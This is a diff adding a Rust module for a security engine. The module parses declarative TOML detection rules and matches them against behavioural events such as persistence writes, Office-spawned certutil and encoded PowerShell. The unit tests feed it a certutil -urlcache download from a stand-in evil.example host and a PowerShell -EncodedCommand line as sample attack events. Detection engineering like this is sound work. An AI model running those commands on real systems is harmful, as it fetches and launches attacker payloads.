@@ -1,0 +1,465 @@
+//! Generic behavioral-rule DSL (TASK-143, FR-130, Phase 10).
+//!
+//! Where [`crate::detect::heuristics`] (TASK-084) hard-codes three
+//! ransomware-specific shapes, this module loads **declarative** TOML
+//! rules that match on a richer per-event vocabulary. The two coexist:
+//! the hard-coded ransomware rules stay where they are (cheapest hot
+//! path); generic TOML rules add coverage for the FR-130 surfaces —
+//! process-tree anomalies, in-memory PE injection, persistence-path
+//! writes, suspicious script-host arguments.
+//!
+//! ## TOML shape
+//!
+//! ```toml
+//! [[rule]]
+//! id          = "behavior:persistence_write"
+//! description = "Write under a known autostart key"
+//! severity    = "high"
+//! event       = "file_write"
+//! path_glob   = ["**\\Run\\*", "**/Library/LaunchAgents/**"]
+//! ```
+//!
+//! Each `[[rule]]` table lists the conditions an event must satisfy for
+//! the rule to fire. The condition fields are AND-combined — an event
+//! has to match every populated condition. Glob-list fields are
+//! OR-combined among their entries.
+//!
+//! ## Why TOML and not Lua / YAML / a Rust trait
+//!
+//! - TOML is already in the workspace deps (config loader).
+//! - The conditions vocabulary is tiny — five fields cover every
+//!   v0.10 rule. A full scripting language would be wasted surface.
+//! - Rules ship in `crates/mythkernel/src/detect/rules/*.toml` and are
+//!   embedded at compile time via `include_str!`. Future signed-rule
+//!   updates (TASK-151's A/B canary rollout) can override by id; the
+//!   loader merges in order, last wins.
+
+use std::path::Path;
+
+use serde::{Deserialize, Serialize};
+
+use crate::detect::Severity;
+
+/// Event kinds the DSL can match. Subset of what a fully-instrumented
+/// engine could emit; expand here as new daemon surfaces come online.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum EventKind {
+    /// File write (open+write+close, FAN_MODIFY on Linux, FSEvents
+    /// Modified on macOS, USN DATA_OVERWRITE on Windows).
+    FileWrite,
+    /// New process started — feeds the process-tree-anomaly rules.
+    ProcessStart,
+    /// One process allocated executable + writable memory in another
+    /// process's address space, then queued a remote thread. Surfaced
+    /// from ETW on Windows; on Linux/macOS this fires once we have the
+    /// equivalent eBPF / ESF authority.
+    PeInjection,
+}
+
+impl EventKind {
+    pub fn as_str(self) -> &'static str {
+        match self {
+            EventKind::FileWrite => "file_write",
+            EventKind::ProcessStart => "process_start",
+            EventKind::PeInjection => "pe_injection",
+        }
+    }
+}
+
+/// One behavioral event the engine submits to the evaluator. Carries
+/// the union of fields any rule might reference; absent fields are
+/// `None` and conditions over them never match.
+#[derive(Debug, Clone, Default)]
+pub struct BehaviorEvent {
+    pub kind: Option<EventKind>,
+    pub path: Option<String>,
+    /// Executable path of the acting process (parent for `process_start`).
+    pub process_exe: Option<String>,
+    /// Full command line of the acting process. Used by `cmdline_substring`.
+    pub process_cmdline: Option<String>,
+    /// Parent's executable path. Used by `parent_exe_glob` for the
+    /// process-tree-anomaly rule shape (Office → certutil etc.).
+    pub parent_exe: Option<String>,
+}
+
+/// One rule from the TOML file.
+#[derive(Debug, Clone, Deserialize, Serialize)]
+pub struct Rule {
+    pub id: String,
+    #[serde(default)]
+    pub description: String,
+    pub event: EventKind,
+    #[serde(rename = "severity")]
+    pub severity_label: String,
+    /// File paths the rule matches against. A rule fires when ANY entry
+    /// matches the event's `path` field via case-insensitive glob.
+    #[serde(default)]
+    pub path_glob: Vec<String>,
+    /// Substrings the event's `process_cmdline` must contain at least
+    /// one of. Case-insensitive.
+    #[serde(default)]
+    pub cmdline_substring: Vec<String>,
+    /// Parent-exe glob list (process-tree-anomaly rules).
+    #[serde(default)]
+    pub parent_exe_glob: Vec<String>,
+    /// Child-exe glob list — pairs with `parent_exe_glob` for the
+    /// classic chain detector (Office → certutil/-urlcache).
+    #[serde(default)]
+    pub child_exe_glob: Vec<String>,
+}
+
+impl Rule {
+    pub fn severity(&self) -> Severity {
+        match self.severity_label.as_str() {
+            "critical" => Severity::Critical,
+            "high" => Severity::High,
+            "medium" => Severity::Medium,
+            "low" => Severity::Low,
+            _ => Severity::Info,
+        }
+    }
+
+    /// Returns true when `event` satisfies every populated condition.
+    pub fn matches(&self, event: &BehaviorEvent) -> bool {
+        if Some(self.event) != event.kind {
+            return false;
+        }
+        if !self.path_glob.is_empty() {
+            let Some(path) = event.path.as_deref() else {
+                return false;
+            };
+            if !self.path_glob.iter().any(|p| glob_match_ci(p, path)) {
+                return false;
+            }
+        }
+        if !self.cmdline_substring.is_empty() {
+            let Some(cmd) = event.process_cmdline.as_deref() else {
+                return false;
+            };
+            let cmd_lower = cmd.to_ascii_lowercase();
+            if !self
+                .cmdline_substring
+                .iter()
+                .any(|s| cmd_lower.contains(&s.to_ascii_lowercase()))
+            {
+                return false;
+            }
+        }
+        if !self.parent_exe_glob.is_empty() {
+            let Some(parent) = event.parent_exe.as_deref() else {
+                return false;
+            };
+            if !self
+                .parent_exe_glob
+                .iter()
+                .any(|p| glob_match_ci(p, parent))
+            {
+                return false;
+            }
+        }
+        if !self.child_exe_glob.is_empty() {
+            let Some(child) = event.process_exe.as_deref() else {
+                return false;
+            };
+            if !self.child_exe_glob.iter().any(|p| glob_match_ci(p, child)) {
+                return false;
+            }
+        }
+        true
+    }
+}
+
+/// Top-level TOML document shape.
+#[derive(Debug, Default, Deserialize, Serialize)]
+pub struct RuleFile {
+    #[serde(default)]
+    pub rule: Vec<Rule>,
+}
+
+/// Parse a single TOML rule file from `source`.
+pub fn parse(source: &str) -> Result<RuleFile, toml::de::Error> {
+    toml::from_str(source)
+}
+
+/// Glob match using only `*` (zero-or-more of any char). `**` collapses
+/// to a single `*` for our use — the glob library would otherwise add a
+/// substantial dep. Path separators are normalised to `/` on both
+/// sides before matching so `**\Run\*` matches `HKCU\Software\…\Run\foo`.
+pub fn glob_match_ci(pattern: &str, candidate: &str) -> bool {
+    let p = normalise(pattern);
+    let c = normalise(candidate);
+    glob_match_chars(p.as_bytes(), c.as_bytes())
+}
+
+fn normalise(s: &str) -> String {
+    s.to_ascii_lowercase().replace('\\', "/").replace("**", "*")
+}
+
+/// Classic two-pointer wildcard match supporting only `*`.
+fn glob_match_chars(pattern: &[u8], candidate: &[u8]) -> bool {
+    let (mut pi, mut ci) = (0usize, 0usize);
+    let (mut star, mut match_) = (None::<usize>, 0usize);
+    while ci < candidate.len() {
+        if pi < pattern.len() && pattern[pi] == b'*' {
+            star = Some(pi);
+            match_ = ci;
+            pi += 1;
+        } else if pi < pattern.len() && pattern[pi] == candidate[ci] {
+            pi += 1;
+            ci += 1;
+        } else if let Some(s) = star {
+            pi = s + 1;
+            match_ += 1;
+            ci = match_;
+        } else {
+            return false;
+        }
+    }
+    while pi < pattern.len() && pattern[pi] == b'*' {
+        pi += 1;
+    }
+    pi == pattern.len()
+}
+
+/// A built rule set — load once at engine start, then call
+/// [`RuleSet::evaluate`] per event.
+#[derive(Debug, Default, Clone)]
+pub struct RuleSet {
+    rules: Vec<Rule>,
+}
+
+impl RuleSet {
+    pub fn new() -> Self {
+        Self::default()
+    }
+
+    /// Merge a parsed file into the set. Rules with an `id` that
+    /// already exists in the set are replaced (last wins) — supports
+    /// the TASK-151 A/B canary rollout's "override by id" pattern.
+    pub fn extend_from(&mut self, file: RuleFile) {
+        for rule in file.rule {
+            if let Some(existing) = self.rules.iter_mut().find(|r| r.id == rule.id) {
+                *existing = rule;
+            } else {
+                self.rules.push(rule);
+            }
+        }
+    }
+
+    /// Load every TOML file under `dir`, in lexical order, into one
+    /// set. Caller picks the directory; the engine resolves a
+    /// per-install rules dir alongside its rule cache.
+    pub fn load_directory(&mut self, dir: &Path) -> std::io::Result<()> {
+        if !dir.exists() {
+            return Ok(());
+        }
+        let mut entries: Vec<_> = std::fs::read_dir(dir)?
+            .filter_map(|e| e.ok())
+            .filter(|e| {
+                e.path()
+                    .extension()
+                    .and_then(|s| s.to_str())
+                    .is_some_and(|s| s.eq_ignore_ascii_case("toml"))
+            })
+            .collect();
+        entries.sort_by_key(|e| e.path());
+        for entry in entries {
+            let body = std::fs::read_to_string(entry.path())?;
+            let file = parse(&body).map_err(std::io::Error::other)?;
+            self.extend_from(file);
+        }
+        Ok(())
+    }
+
+    /// Number of rules in the set. Test + observability hook.
+    pub fn len(&self) -> usize {
+        self.rules.len()
+    }
+
+    pub fn is_empty(&self) -> bool {
+        self.rules.is_empty()
+    }
+
+    pub fn rule_ids(&self) -> impl Iterator<Item = &str> {
+        self.rules.iter().map(|r| r.id.as_str())
+    }
+
+    /// Evaluate `event` against every loaded rule. Returns every rule
+    /// id that fires (rules are independent — a single event can light
+    /// up multiple rules, e.g. a write to a LaunchAgent path that also
+    /// happens to look like a persistence write would fire both rules).
+    pub fn evaluate(&self, event: &BehaviorEvent) -> Vec<&Rule> {
+        self.rules.iter().filter(|r| r.matches(event)).collect()
+    }
+}
+
+/// Built-in seed rule set — compiled into the binary so a fresh
+/// install has heuristics live before any feed update lands. The TASK-151
+/// canary rollout can shadow / replace individual ids without touching
+/// these files.
+pub fn builtin_rules() -> RuleSet {
+    let mut set = RuleSet::new();
+    for source in BUILTIN_RULE_SOURCES {
+        if let Ok(file) = parse(source) {
+            set.extend_from(file);
+        }
+    }
+    set
+}
+
+const BUILTIN_RULE_SOURCES: &[&str] = &[
+    include_str!("rules/persistence_write.toml"),
+    include_str!("rules/script_host_suspicious.toml"),
+    include_str!("rules/process_chain_office_lolbin.toml"),
+];
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn ev_file_write(path: &str) -> BehaviorEvent {
+        BehaviorEvent {
+            kind: Some(EventKind::FileWrite),
+            path: Some(path.into()),
+            ..Default::default()
+        }
+    }
+
+    fn ev_process_start(parent: &str, child: &str, cmd: &str) -> BehaviorEvent {
+        BehaviorEvent {
+            kind: Some(EventKind::ProcessStart),
+            parent_exe: Some(parent.into()),
+            process_exe: Some(child.into()),
+            process_cmdline: Some(cmd.into()),
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn glob_match_handles_double_star_and_separators() {
+        assert!(glob_match_ci(
+            "**/Library/LaunchAgents/**",
+            "/Users/me/Library/LaunchAgents/x.plist"
+        ));
+        assert!(glob_match_ci(
+            "**\\Run\\*",
+            "HKCU\\Software\\Microsoft\\Windows\\Run\\foo"
+        ));
+        assert!(!glob_match_ci("*.exe", "foo.dll"));
+        assert!(glob_match_ci("*.EXE", "foo.exe"));
+    }
+
+    #[test]
+    fn rule_matches_only_when_every_populated_field_matches() {
+        let rule = Rule {
+            id: "test:r1".into(),
+            description: "".into(),
+            event: EventKind::FileWrite,
+            severity_label: "high".into(),
+            path_glob: vec!["**/Run/*".into()],
+            cmdline_substring: vec![],
+            parent_exe_glob: vec![],
+            child_exe_glob: vec![],
+        };
+        assert!(rule.matches(&ev_file_write("/x/Run/foo")));
+        assert!(!rule.matches(&ev_file_write("/x/notmatching/foo")));
+        // Wrong event kind — never matches.
+        let mut other = ev_file_write("/x/Run/foo");
+        other.kind = Some(EventKind::ProcessStart);
+        assert!(!rule.matches(&other));
+    }
+
+    #[test]
+    fn builtin_rules_load_without_error() {
+        let set = builtin_rules();
+        assert!(set.len() >= 3, "expected ≥3 seed rules, got {}", set.len());
+        // Every seed rule should have a unique id.
+        let ids: Vec<&str> = set.rule_ids().collect();
+        let mut unique = ids.clone();
+        unique.sort();
+        unique.dedup();
+        assert_eq!(ids.len(), unique.len(), "duplicate rule ids");
+    }
+
+    #[test]
+    fn extend_from_overrides_by_id() {
+        let a: RuleFile = parse(
+            r#"
+[[rule]]
+id = "x"
+event = "file_write"
+severity = "low"
+path_glob = ["**/a"]
+"#,
+        )
+        .unwrap();
+        let b: RuleFile = parse(
+            r#"
+[[rule]]
+id = "x"
+event = "file_write"
+severity = "critical"
+path_glob = ["**/b"]
+"#,
+        )
+        .unwrap();
+        let mut set = RuleSet::new();
+        set.extend_from(a);
+        set.extend_from(b);
+        assert_eq!(set.len(), 1);
+        assert_eq!(
+            set.evaluate(&ev_file_write("/b"))[0].severity(),
+            Severity::Critical
+        );
+        assert!(set.evaluate(&ev_file_write("/a")).is_empty());
+    }
+
+    #[test]
+    fn process_chain_rule_fires_on_office_then_lolbin() {
+        let set = builtin_rules();
+        let event = ev_process_start(
+            "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
+            "C:\\Windows\\System32\\certutil.exe",
+            "certutil.exe -urlcache -split -f https://evil.example/x.exe",
+        );
+        let hits = set.evaluate(&event);
+        assert!(
+            hits.iter()
+                .any(|r| r.id == "behavior:process_chain_office_lolbin"),
+            "office→lolbin rule should fire"
+        );
+    }
+
+    #[test]
+    fn persistence_rule_fires_on_run_key_write() {
+        let set = builtin_rules();
+        // Windows Run-key path shape — the rule normalises separators.
+        let hits = set.evaluate(&ev_file_write(
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\foo",
+        ));
+        assert!(
+            hits.iter().any(|r| r.id == "behavior:persistence_write"),
+            "persistence-write rule should fire on a Run-key write"
+        );
+    }
+
+    #[test]
+    fn script_host_rule_fires_on_powershell_encoded_command() {
+        let set = builtin_rules();
+        let event = BehaviorEvent {
+            kind: Some(EventKind::ProcessStart),
+            process_exe: Some(
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".into(),
+            ),
+            process_cmdline: Some("powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQ".into()),
+            ..Default::default()
+        };
+        let hits = set.evaluate(&event);
+        assert!(
+            hits.iter()
+                .any(|r| r.id == "behavior:script_host_suspicious"),
+            "script-host rule should fire on -EncodedCommand"
+        );
+    }
+}
